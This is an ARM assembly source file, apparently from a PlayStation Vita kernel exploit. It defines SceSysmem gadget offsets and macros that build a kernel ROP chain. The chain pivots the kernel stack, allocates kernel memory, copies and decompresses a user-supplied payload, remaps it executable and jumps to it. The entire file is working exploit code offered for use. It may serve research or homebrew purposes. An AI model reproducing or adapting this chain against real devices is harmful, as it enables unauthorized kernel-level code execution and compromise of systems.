/* krop.S -- kernel rop chain
 *
 * Copyright (C) 2018 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

// Kernel offsets
.equ KSTACK_SIZE,                                 0x1000
.equ KSTACK_DEVCTL_INDATA_OFFSET,                 0x6f8
.equ KSTACK_SYSMEM_OFFSET,                        0x89c
.equ SCE_SYSMEM_OFFSET,                           -0x1697

// call
.equ SceSysmem_blx_r0,                            0x1fb3f
.equ SceSysmem_blx_r4_pop_r4_pc,                  0x19fb9

// load
.equ SceSysmem_pop_pc,                            0x347
.equ SceSysmem_pop_r0_r1_pc,                      0x853
.equ SceSysmem_pop_r0_r1_r2_r3_r4_pc,             0x258bd
.equ SceSysmem_pop_r1_r2_r4_r6_pc,                0x288ff
.equ SceSysmem_pop_r3_pc,                         0x1d8f
.equ SceSysmem_pop_r3_r4_r5_pc,                   0x1377
.equ SceSysmem_pop_r3_r4_r5_r6_r7_pc,             0xf59
.equ SceSysmem_ldr_r0_r0_blx_r3,                  0x11337
.equ SceSysmem_ldr_r2_r5_14_blx_r3,               0x1f697

// store
.equ SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc,     0x4f71

// move
.equ SceSysmem_mov_sp_r1_blx_r2,                  0x67

// arithmetic
.equ SceSysmem_adds_r0_1_bx_lr,                   0x533b
.equ SceSysmem_add_r1_sp_bc_mov_r2_r6_blx_r3,     0x1d97d
.equ SceSysmem_sub_r1_r1_r3_bx_lr,                0x86d

// functions
.equ SceSysmem_ksceKernelGetMemBlockBase,         0x5849
.equ SceSysmem_ksceKernelAllocMemBlock,           0x7d3d
.equ SceSysmem_ksceKernelRemapBlock,              0x7f69
.equ SceSysmem_ksceKernelFreeMemBlock,            0x825d
.equ SceSysmem_ksceDeflateDecompress,             0x1c3bb
.equ SceSysmem_ksceKernelMemcpyUserToKernel,      0x6289
.equ SceSysmem_ksceKernelCpuDcacheWritebackRange, 0x22fcd

// misc
.equ SceSysmem_empty_string,                      0x19

// Variables that lie in the kernel stack
.equ payload_temp_block,                          0x00
.equ payload_temp_blockid,                        0x04
.equ payload_code_block,                          0x08
.equ payload_code_blockid,                        0x0c

// Max decompressed payload size
.equ PAYLOAD_DECOMPRESSED_SIZE,                   0x100000

.macro init_krop dst
  .set krop_chain, \dst
.endm

.macro push base, gadget
  .if \base == 0
    store_vv \gadget, krop_chain
  .elseif \base == 1
    load_add_store krop_chain, sysmem_base, \gadget
  .elseif \base == 2
    load_add_store krop_chain, kstack_base, \gadget
  .elseif \base == 9
    // Dummy
  .endif
  .set krop_chain, krop_chain + 4
.endm

.macro build_krop dst
  // Init krop chain
  init_krop \dst

  // Allocate temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 1, SceSysmem_empty_string                      // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW          // r1
  push 0, (payload_size + 0xfff) & ~0xfff             // r2
  push 0, NULL                                        // r3
  push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
  push 2, payload_temp_blockid                        // r4
  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc     // pc
  push 9, 0xDEADBEEF                                  // r4

  // Get temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_temp_blockid                        // r0
  push 2, payload_temp_block                          // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelGetMemBlockBase         // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Allocate code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 1, SceSysmem_empty_string                      // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW          // r1
  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r2
  push 0, NULL                                        // r3
  push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
  push 2, payload_code_blockid                        // r4
  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc     // pc
  push 9, 0xDEADBEEF                                  // r4

  // Get code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_blockid                        // r0
  push 2, payload_code_block                          // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelGetMemBlockBase         // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Copy compressed payload from user to temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_temp_block                          // r0
  push 0, payload_start                               // r1
  push 0, payload_size                                // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelMemcpyUserToKernel      // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Decompress payload to code block
  push 1, SceSysmem_pop_r3_r4_r5_pc                   // pc
  push 1, SceSysmem_pop_pc                            // r3
  push 1, SceSysmem_ksceDeflateDecompress             // r4
  push 2, payload_temp_block - 0x14                   // r5
  push 1, SceSysmem_ldr_r2_r5_14_blx_r3               // pc
  push 1, SceSysmem_pop_r0_r1_pc                      // pc
  push 2, payload_code_block                          // r0
  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r1
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 1, SceSysmem_pop_r3_pc                         // pc
  push 0, NULL                                        // r3
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Free temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_temp_blockid                        // r0
  push 9, 0xDEADBEEF                                  // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelFreeMemBlock            // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Mark code block as executable
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_blockid                        // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX          // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelRemapBlock              // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Clean cache
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_block                          // r0
  push 0, PAYLOAD_DECOMPRESSED_SIZE                   // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelCpuDcacheWritebackRange // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Execute payload
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_block                          // r0
  push 1, 0                                           // r1
  push 0, framebuf                                    // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_adds_r0_1_bx_lr                   // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4
  push 1, SceSysmem_blx_r0                            // pc
.endm

.macro build_pivot_krop dst
  // Init krop chain
  init_krop \dst

  // Kernel stack pivot
  .set difference, (KSTACK_SIZE - OVERWRITE_SIZE) - KSTACK_DEVCTL_INDATA_OFFSET
  push 1, SceSysmem_pop_r3_r4_r5_r6_r7_pc             // pc
  push 1, SceSysmem_pop_r3_pc                         // r3
  push 1, SceSysmem_sub_r1_r1_r3_bx_lr                // r4
  push 9, 0xDEADBEEF                                  // r5
  push 1, SceSysmem_pop_pc                            // r6
  push 9, 0xDEADBEEF                                  // r7
  push 1, SceSysmem_add_r1_sp_bc_mov_r2_r6_blx_r3     // pc
  push 0, 0x1c + 0xbc + difference                    // r3
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
  push 9, 0xDEADBEEF                                  // r4
  push 1, SceSysmem_mov_sp_r1_blx_r2                  // pc
.endm
